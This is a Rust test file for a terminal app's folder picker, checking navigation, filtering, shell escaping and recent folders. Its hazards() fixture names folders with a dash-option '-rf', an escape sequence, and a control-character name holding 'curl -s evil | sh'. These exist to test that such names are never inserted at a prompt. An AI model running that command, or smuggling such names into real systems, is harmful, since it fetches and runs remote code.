//! The folder picker in a real window (see `window::test_harness`: each test runs in a child process with scratch
//! data and `/bin/cat` for a shell, which echoes what is inserted, so the screen shows the path).
//!
//! A test window has no native panel, so the keys, the text and the clicks the panel would report are fed to the
//! picker directly (`Picker::feed`): the same events, the same rules, the same queries off the main thread.

use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use gpui_kit::{Focusable as _, TestAppContext};
use wormhole_core::config::features::FeatureFlag;
use wormhole_core::keys::keymap::ActionId;
use wormhole_core::storage::store::{SessionRecord, WindowRecord};
use wormhole_core::view::picker::{Field, Item, Key};

use super::FolderPicker;
use crate::app_state::{OpenWindow, app, recent_folders};
use crate::picker::Picker;
use crate::platform::picker::Event;
use crate::settings::update_settings;
use crate::terminal_view::TerminalView;
use crate::window::test_harness::{draw, drive, isolate_in, press, read, read_cx, start_with, with_window};

fn isolate(name: &str) -> bool {
    isolate_in(module_path!(), name)
}

fn flag(cx: &mut TestAppContext, on: bool) {
    cx.update(|cx| {
        update_settings(cx, |s| _ = s.feature_flags.insert(FeatureFlag::FolderPicker.key().into(), on))
    });
}

/// A folder tree to list, made inside the scratch data folder the harness gave this test (so nothing of the
/// person's is read): folders with a space and a dot, a folder with a folder in it, a file.
struct Tree(PathBuf);

impl Tree {
    fn path(&self) -> &Path {
        &self.0
    }
}

fn make(name: &str, dirs: &[&str]) -> Tree {
    let data = std::env::var_os("WORMHOLE_DATA_DIR").expect("the harness's scratch data folder");
    let root = PathBuf::from(data).join(name);
    for path in dirs {
        std::fs::create_dir_all(root.join(path)).expect("a folder");
    }
    std::fs::write(root.join("file.txt"), "x").expect("a file");
    Tree(root)
}

fn tree() -> Tree {
    make("picker-tree", &["alpha", "beta/inner", "My Folder", ".hidden"])
}

/// A window whose terminal starts in `folder`, drawn, the flag on.
fn open_in(cx: &mut TestAppContext, folder: &Path) -> OpenWindow {
    let record = WindowRecord {
        id: 1,
        sessions: vec![SessionRecord::new(1, None, Some(folder.to_string_lossy().into_owned()))],
        ..Default::default()
    };
    let window = start_with(cx, record);
    flag(cx, true);
    draw(cx, &window);
    window
}

fn terminal(cx: &mut TestAppContext, window: &OpenWindow) -> gpui_kit::Entity<TerminalView> {
    read(cx, window, |ws| ws.active_terminal().clone())
}

fn terminal_focused(cx: &mut TestAppContext, window: &OpenWindow) -> bool {
    with_window(cx, window, |win, cx| {
        let workspace = window.workspace.upgrade().expect("the window is open");
        workspace.read(cx).active_terminal().focus_handle(cx).is_focused(win)
    })
}

fn picker(cx: &mut TestAppContext, window: &OpenWindow) -> gpui_kit::Entity<Picker> {
    read_cx(cx, window, |ws, cx| {
        ws.overlay_of::<FolderPicker>().expect("the picker is open").read(cx).picker.clone()
    })
}

/// Let the picker's queries finish: they run off the main thread and come back by generation.
fn settle(cx: &mut TestAppContext, window: &OpenWindow) {
    let picker = picker(cx, window);
    let limit = Instant::now() + Duration::from_secs(10);
    loop {
        cx.run_until_parked();
        if cx.update(|cx| picker.read(cx).idle()) {
            return;
        }
        assert!(Instant::now() < limit, "the picker never settled");
        cx.executor().advance_clock(Duration::from_millis(100));
        std::thread::sleep(Duration::from_millis(5));
    }
}

fn feed(cx: &mut TestAppContext, window: &OpenWindow, event: Event) {
    drive(cx, window, move |ws, _, cx| {
        let host = ws.overlay_of::<FolderPicker>().expect("the picker is open");
        let picker = host.read(cx).picker.clone();
        picker.update(cx, |picker, cx| picker.feed(event, cx));
    });
}

fn text_of(cx: &mut TestAppContext, window: &OpenWindow) -> String {
    let picker = picker(cx, window);
    cx.update(|cx| picker.read(cx).model.text().to_string())
}

/// A key, with the caret at the end of what is typed.
fn key(cx: &mut TestAppContext, window: &OpenWindow, key: Key) {
    let text = text_of(cx, window);
    feed(cx, window, Event::Key(key, Field::at_end(&text)));
    draw(cx, window);
}

/// Type `text` into the field (the whole text, as the field would report it), and wait for the list.
fn typed(cx: &mut TestAppContext, window: &OpenWindow, text: &str) {
    feed(cx, window, Event::Typed(Field::at_end(text)));
    settle(cx, window);
    draw(cx, window);
}

fn items(cx: &mut TestAppContext, window: &OpenWindow) -> Vec<Item> {
    let picker = picker(cx, window);
    cx.update(|cx| picker.read(cx).model.snapshot().items)
}

/// What the open picker lists, as devctl's `state` would.
fn rows(cx: &mut TestAppContext, window: &OpenWindow) -> Vec<String> {
    items(cx, window)
        .into_iter()
        .filter_map(|item| match item {
            Item::Row(row) => Some(row.label),
            _ => None,
        })
        .collect()
}

/// Wait for the screen of the terminal to show `what`: the shell is `cat`, which echoes after a moment.
fn screen_shows(cx: &mut TestAppContext, window: &OpenWindow, what: &str) {
    let terminal = terminal(cx, window);
    let limit = Instant::now() + Duration::from_secs(10);
    while !cx.update(|cx| terminal.read(cx).screen_text().contains(what)) {
        assert!(Instant::now() < limit, "the screen never showed {what:?}");
        std::thread::sleep(Duration::from_millis(10));
        cx.run_until_parked();
    }
}

fn open_picker(cx: &mut TestAppContext, window: &OpenWindow) {
    draw(cx, window);
    press(cx, window, "cmd-j");
    draw(cx, window);
    settle(cx, window);
}

fn is_open(cx: &mut TestAppContext, window: &OpenWindow) -> bool {
    read(cx, window, |ws| ws.folder_picker_open())
}

#[gpui_kit::test]
fn cmd_j_opens_the_picker_over_the_terminals_folders_and_esc_gives_the_keyboard_back(
    cx: &mut TestAppContext,
) {
    if isolate("cmd_j_opens_the_picker_over_the_terminals_folders_and_esc_gives_the_keyboard_back") {
        return;
    }
    let dir = tree();
    let window = open_in(cx, dir.path());
    assert!(terminal_focused(cx, &window));
    open_picker(cx, &window);
    assert!(is_open(cx, &window), "⌘J opens it");
    assert_eq!(rows(cx, &window), ["alpha", "beta", "My Folder"], "ls order, no files, no dot-folders");
    key(cx, &window, Key::Escape);
    assert!(!is_open(cx, &window));
    assert!(terminal_focused(cx, &window), "the keyboard is back in the terminal");

    // ⌘J again toggles it.
    open_picker(cx, &window);
    assert!(is_open(cx, &window));
    press(cx, &window, "cmd-j");
    assert!(!is_open(cx, &window), "⌘J closes it");
    assert!(terminal_focused(cx, &window));
}

#[gpui_kit::test]
fn with_the_flag_off_cmd_j_does_nothing_and_the_menu_has_no_item(cx: &mut TestAppContext) {
    if isolate("with_the_flag_off_cmd_j_does_nothing_and_the_menu_has_no_item") {
        return;
    }
    let dir = tree();
    let window = open_in(cx, dir.path());
    flag(cx, false);
    draw(cx, &window);
    press(cx, &window, "cmd-j");
    draw(cx, &window);
    assert!(!is_open(cx, &window));
    assert!(terminal_focused(cx, &window));
    let hidden = |cx: &mut TestAppContext, window: &OpenWindow| {
        read_cx(cx, window, |ws, cx| ws.menu_state(cx).hidden.contains(&ActionId::InsertFolderPath))
    };
    assert!(hidden(cx, &window), "no menu item, palette row or sheet line");
    flag(cx, true);
    assert!(!hidden(cx, &window));
}

#[gpui_kit::test]
fn typing_narrows_the_list_and_return_inserts_the_path_at_the_prompt(cx: &mut TestAppContext) {
    if isolate("typing_narrows_the_list_and_return_inserts_the_path_at_the_prompt") {
        return;
    }
    let dir = tree();
    let window = open_in(cx, dir.path());
    open_picker(cx, &window);
    typed(cx, &window, "b");
    assert_eq!(rows(cx, &window), ["beta"]);
    key(cx, &window, Key::Enter);
    assert!(!is_open(cx, &window), "↩ closes it");
    assert!(terminal_focused(cx, &window));
    screen_shows(cx, &window, "beta/");
}

#[gpui_kit::test]
fn the_arrows_move_tab_descends_and_a_path_comes_out_as_it_was_typed(cx: &mut TestAppContext) {
    if isolate("the_arrows_move_tab_descends_and_a_path_comes_out_as_it_was_typed") {
        return;
    }
    let dir = tree();
    let window = open_in(cx, dir.path());
    open_picker(cx, &window);
    key(cx, &window, Key::Down);
    key(cx, &window, Key::Down);
    key(cx, &window, Key::Up);
    // Selected: beta. ⇥ writes it into the field and lists its folders.
    key(cx, &window, Key::Tab);
    settle(cx, &window);
    assert_eq!(text_of(cx, &window), "beta/");
    assert_eq!(rows(cx, &window), ["inner"]);
    key(cx, &window, Key::Enter);
    screen_shows(cx, &window, "beta/inner/");
}

#[gpui_kit::test]
fn a_name_with_a_space_is_escaped_for_the_shell(cx: &mut TestAppContext) {
    if isolate("a_name_with_a_space_is_escaped_for_the_shell") {
        return;
    }
    let dir = tree();
    let window = open_in(cx, dir.path());
    open_picker(cx, &window);
    typed(cx, &window, "My");
    assert_eq!(rows(cx, &window), ["My Folder"]);
    key(cx, &window, Key::Enter);
    screen_shows(cx, &window, r"My\ Folder/");
}

#[gpui_kit::test]
fn a_path_walks_up_and_a_dot_shows_dot_folders_and_nothing_lists_as_no_folders(cx: &mut TestAppContext) {
    if isolate("a_path_walks_up_and_a_dot_shows_dot_folders_and_nothing_lists_as_no_folders") {
        return;
    }
    let dir = tree();
    let inner = dir.path().join("beta/inner");
    let window = open_in(cx, &inner);
    open_picker(cx, &window);
    assert!(rows(cx, &window).is_empty(), "a folder with no folders");
    assert!(matches!(items(cx, &window)[..], [Item::Note(_)]), "and it says so");
    typed(cx, &window, "../../");
    assert_eq!(rows(cx, &window), ["alpha", "beta", "My Folder"]);
    typed(cx, &window, "../../.");
    assert_eq!(rows(cx, &window), [".hidden"]);
    typed(cx, &window, "../../zzz");
    assert!(rows(cx, &window).is_empty());
    typed(cx, &window, "../../a");
    key(cx, &window, Key::Enter);
    screen_shows(cx, &window, "../../alpha/");
}

#[gpui_kit::test]
fn a_click_on_a_row_inserts_it_and_a_click_away_closes_it(cx: &mut TestAppContext) {
    if isolate("a_click_on_a_row_inserts_it_and_a_click_away_closes_it") {
        return;
    }
    let dir = tree();
    let window = open_in(cx, dir.path());
    open_picker(cx, &window);
    feed(cx, &window, Event::Row(0));
    draw(cx, &window);
    assert!(!is_open(cx, &window), "a click on a row picks it");
    screen_shows(cx, &window, "alpha/");

    // Open again; the panel losing the key (a click on the terminal, another app) closes it, and the terminal
    // has the keyboard.
    open_picker(cx, &window);
    assert!(is_open(cx, &window));
    feed(cx, &window, Event::Resigned);
    draw(cx, &window);
    assert!(!is_open(cx, &window), "losing the key closes it");
    assert!(terminal_focused(cx, &window));
}

/// A folder with names that must not reach a prompt as they are: a dash first, and keystrokes.
fn hazards() -> Tree {
    let data = std::env::var_os("WORMHOLE_DATA_DIR").expect("the harness's scratch data folder");
    let root = PathBuf::from(data).join("picker-hazards");
    for name in ["-rf", "ok", "_\u{15}curl -s evil | sh\n", "tab\there", "esc\u{1b}[2J"] {
        std::fs::create_dir_all(root.join(name)).expect("a folder");
    }
    Tree(root)
}

#[gpui_kit::test]
fn a_name_with_a_control_character_is_not_listed_and_a_dash_is_kept_from_being_an_option(
    cx: &mut TestAppContext,
) {
    if isolate("a_name_with_a_control_character_is_not_listed_and_a_dash_is_kept_from_being_an_option") {
        return;
    }
    let dir = hazards();
    let window = open_in(cx, dir.path());
    open_picker(cx, &window);
    assert_eq!(rows(cx, &window), ["-rf", "ok"], "the names that are keystrokes aren't there to pick");
    key(cx, &window, Key::Enter);
    screen_shows(cx, &window, "./-rf/");
}

#[gpui_kit::test]
fn cmd_j_with_the_keyboard_outside_the_terminal_does_nothing(cx: &mut TestAppContext) {
    if isolate("cmd_j_with_the_keyboard_outside_the_terminal_does_nothing") {
        return;
    }
    let dir = tree();
    let window = open_in(cx, dir.path());
    // F6 moves the keyboard to the next area of the window (not the terminal).
    press(cx, &window, "f6");
    draw(cx, &window);
    assert!(!terminal_focused(cx, &window), "the keyboard is in another area");
    press(cx, &window, "cmd-j");
    draw(cx, &window);
    assert!(!is_open(cx, &window), "the key is the terminal's");
    // The menu and the palette run the action from anywhere: it still does nothing there.
    cx.update(crate::folder_picker::toggle);
    cx.run_until_parked();
    assert!(!is_open(cx, &window), "nor from a menu while the keyboard is elsewhere");
}

#[gpui_kit::test]
fn the_picker_closes_when_another_terminal_comes_to_the_front_and_pastes_nothing(cx: &mut TestAppContext) {
    if isolate("the_picker_closes_when_another_terminal_comes_to_the_front_and_pastes_nothing") {
        return;
    }
    let dir = tree();
    let folder = dir.path().to_string_lossy().into_owned();
    let record = WindowRecord {
        id: 1,
        sessions: vec![
            SessionRecord::new(1, None, Some(folder.clone())),
            SessionRecord::new(2, None, Some(folder)),
        ],
        ..Default::default()
    };
    let window = start_with(cx, record);
    flag(cx, true);
    draw(cx, &window);
    let first = terminal(cx, &window);
    open_picker(cx, &window);
    assert!(is_open(cx, &window));
    // ⌘2: another terminal comes to the front while the panel is up.
    press(cx, &window, "cmd-2");
    draw(cx, &window);
    assert!(!is_open(cx, &window), "the picker went with the terminal it was for");
    assert!(terminal(cx, &window) != first, "the other one is in front");
    for terminal in [first, terminal(cx, &window)] {
        let screen = cx.update(|cx| terminal.read(cx).screen_text());
        assert!(!screen.contains("alpha"), "nothing was pasted: {screen:?}");
    }
}

#[gpui_kit::test]
fn the_ghost_completes_the_selected_row_and_right_and_tab_accept_it(cx: &mut TestAppContext) {
    if isolate("the_ghost_completes_the_selected_row_and_right_and_tab_accept_it") {
        return;
    }
    let dir = tree();
    let window = open_in(cx, dir.path());
    open_picker(cx, &window);
    typed(cx, &window, "al");
    let ghost = |cx: &mut TestAppContext| {
        let picker = picker(cx, &window);
        cx.update(|cx| picker.read(cx).model.snapshot().ghost)
    };
    assert_eq!(ghost(cx).as_deref(), Some("pha/"));
    key(cx, &window, Key::Right);
    settle(cx, &window);
    assert_eq!(text_of(cx, &window), "alpha/", "→ at the end of the text accepts the ghost");
    assert_eq!(ghost(cx), None, "nothing more to complete");
    // A letter typed that no folder starts with has no ghost, and ⇥ still goes into the folder.
    typed(cx, &window, "bt");
    assert_eq!(rows(cx, &window), ["beta"], "forgiving: the letters are in order");
    assert_eq!(ghost(cx), None);
    key(cx, &window, Key::Tab);
    settle(cx, &window);
    assert_eq!(text_of(cx, &window), "beta/");
}

#[gpui_kit::test]
fn left_goes_up_only_where_it_cannot_be_moving_the_caret(cx: &mut TestAppContext) {
    if isolate("left_goes_up_only_where_it_cannot_be_moving_the_caret") {
        return;
    }
    let dir = tree();
    let window = open_in(cx, dir.path());
    open_picker(cx, &window);
    typed(cx, &window, "beta/inner/");
    key(cx, &window, Key::Left);
    settle(cx, &window);
    assert_eq!(text_of(cx, &window), "beta/", "after the closing slash ← goes up one level");
    typed(cx, &window, "beta/in");
    // Editing a name: the field keeps ←, so the text is as it was.
    key(cx, &window, Key::Left);
    assert_eq!(text_of(cx, &window), "beta/in");
    // At the very start it goes up, whatever is typed.
    let text = text_of(cx, &window);
    feed(cx, &window, Event::Key(Key::Left, Field { text, caret: 0, selected: 0 }));
    settle(cx, &window);
    assert_eq!(text_of(cx, &window), "");
}

#[gpui_kit::test]
fn typing_several_levels_finds_a_folder_by_a_forgiving_path(cx: &mut TestAppContext) {
    if isolate("typing_several_levels_finds_a_folder_by_a_forgiving_path") {
        return;
    }
    let dir = make("picker-levels", &["Projects/terminal/src", "Projects/website", "Pictures/trips"]);
    let window = open_in(cx, dir.path());
    open_picker(cx, &window);
    typed(cx, &window, "pr/te");
    assert_eq!(rows(cx, &window).first().map(String::as_str), Some("Projects/terminal"));
    key(cx, &window, Key::Enter);
    screen_shows(cx, &window, "Projects/terminal/");
}

#[gpui_kit::test]
fn folders_with_folders_get_a_chevron_and_a_repository_its_branch(cx: &mut TestAppContext) {
    if isolate("folders_with_folders_get_a_chevron_and_a_repository_its_branch") {
        return;
    }
    let dir = make("picker-badges", &["plain", "nested/child", "repo/.git", "repo/src"]);
    std::fs::write(dir.path().join("repo/.git/HEAD"), "ref: refs/heads/trunk\n").expect("a HEAD");
    let window = open_in(cx, dir.path());
    open_picker(cx, &window);
    let decorated: Vec<(String, bool, Option<String>)> = items(cx, &window)
        .into_iter()
        .filter_map(|item| match item {
            Item::Row(row) => Some((row.label, row.chevron, row.badge)),
            _ => None,
        })
        .collect();
    assert_eq!(
        decorated,
        [
            ("nested".to_string(), true, None),
            ("plain".to_string(), false, None),
            ("repo".to_string(), true, Some("trunk".to_string())),
        ]
    );
}

/// Folders outside the scratch data folder and the temporary ones (which are never recorded): this crate's own.
fn real_folders() -> (PathBuf, PathBuf) {
    let manifest = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    (manifest.join("src"), manifest.join("tests"))
}

#[gpui_kit::test]
fn recent_folders_are_listed_after_the_subfolders_ranked_in_when_typed_and_forgotten_with_cmd_delete(
    cx: &mut TestAppContext,
) {
    if isolate(
        "recent_folders_are_listed_after_the_subfolders_ranked_in_when_typed_and_forgotten_with_cmd_delete",
    ) {
        return;
    }
    let dir = tree();
    let (src, tests) = real_folders();
    let window = open_in(cx, dir.path());
    let profile = read(cx, &window, |ws| ws.profile().clone());
    cx.update(|cx| {
        // A test app has no database: this one's own, in the scratch folder.
        let scratch = std::path::PathBuf::from(std::env::var_os("WORMHOLE_DATA_DIR").expect("scratch"));
        let store =
            wormhole_core::storage::store::Store::open_at(&scratch.join("picker-db")).expect("a store");
        crate::app_state::app_mut(cx).store = Some(store);
        recent_folders::record(app(cx), &profile, &src);
        // The data folder and the temporary folders are never recorded.
        recent_folders::record(app(cx), &profile, dir.path());
        recent_folders::record(app(cx), &profile, &std::env::temp_dir());
        std::thread::sleep(Duration::from_millis(5));
        recent_folders::record(app(cx), &profile, &tests);
    });
    open_picker(cx, &window);
    let lines = items(cx, &window);
    let at = lines.iter().position(|i| matches!(i, Item::Header(_))).expect("a section of its own");
    let recent: Vec<&str> = lines[at + 1..]
        .iter()
        .filter_map(|i| match i {
            Item::Row(row) => Some(row.label.as_str()),
            _ => None,
        })
        .collect();
    assert_eq!(recent.len(), 2, "only the two real folders: {recent:?}");
    assert!(recent.contains(&"src") && recent.contains(&"tests"));
    assert!(
        lines[..at].iter().filter(|i| matches!(i, Item::Row(_))).count() == 3,
        "the subfolders come first"
    );

    // Typed, they are ranked in with the rest, with no section of their own.
    typed(cx, &window, "tests");
    let lines = items(cx, &window);
    assert!(!lines.iter().any(|i| matches!(i, Item::Header(_))));
    assert!(
        matches!(&lines[0], Item::Row(row) if row.label == "tests" && row.icon == "clock.arrow.circlepath")
    );

    // ⌘⌫ forgets the selected recent folder.
    key(cx, &window, Key::Forget);
    settle(cx, &window);
    assert!(rows(cx, &window).is_empty(), "forgotten: {:?}", rows(cx, &window));
    let kept = cx.update(|cx| recent_folders::load(app(cx), &profile).len());
    assert_eq!(kept, 1, "and gone from the store");
}
